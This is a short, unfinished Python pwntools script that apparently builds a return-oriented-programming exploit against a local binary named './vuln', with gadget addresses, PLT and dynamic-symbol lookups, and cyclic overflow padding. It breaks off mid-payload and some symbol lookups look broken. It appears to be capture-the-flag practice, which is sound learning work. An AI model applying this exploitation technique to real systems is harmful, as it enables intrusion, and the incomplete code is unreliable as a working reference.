import _struct
from pwn import *


p = process("./vuln")
e = ELF("./vuln")

# attach(p)

ret = 0x080485cb
read = e.symbols["read"]
pop3 = 0x080486da
pop2 = 0x080486db
pop1 = 0x080486dc
buf = 0x0804a040 # address of buffer and where the read message will be stored
plt0 = e.symbols["plt.read"]
rel_plt = e.symbols["rel.plt"]
dynsym = e.symbols["dynsym"]
dynstr = e.symbols["dynstr"]

# pre write and pre system
log.info("buf is:    " + hex(buf))

# stitch together your ROP chain
# padding = "A" * cyclic_find(0x61616166)
padding = cyclic(0x54) # Gets esp to where I want it to be
adblerp = padding + p32(rel_plt) #
